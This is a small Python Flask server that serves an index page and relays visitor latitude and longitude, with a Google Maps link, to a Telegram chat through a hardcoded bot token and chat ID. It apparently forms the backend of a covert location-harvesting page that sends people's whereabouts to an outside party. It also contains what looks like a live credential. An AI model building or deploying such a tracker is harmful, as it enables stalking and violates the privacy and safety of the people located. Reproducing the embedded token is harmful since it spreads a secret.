from flask import Flask, request, jsonify, send_from_directory
import requests
import os

app = Flask(__name__, static_folder='.')

BOT_TOKEN = "8332410324:AAEai9n4ojPBRHD6QT92IvQAhuiYzfXeMR4"
CHAT_ID = "7744463904"

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route("/send-location", methods=["POST"])
def send_location():
    data = request.json
    lat = data.get("latitude")
    lon = data.get("longitude")
    if lat and lon:
        msg = f"📍 موقع جديد:\nخط العرض: {lat}\nخط الطول: {lon}\nhttps://www.google.com/maps?q={lat},{lon}"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400
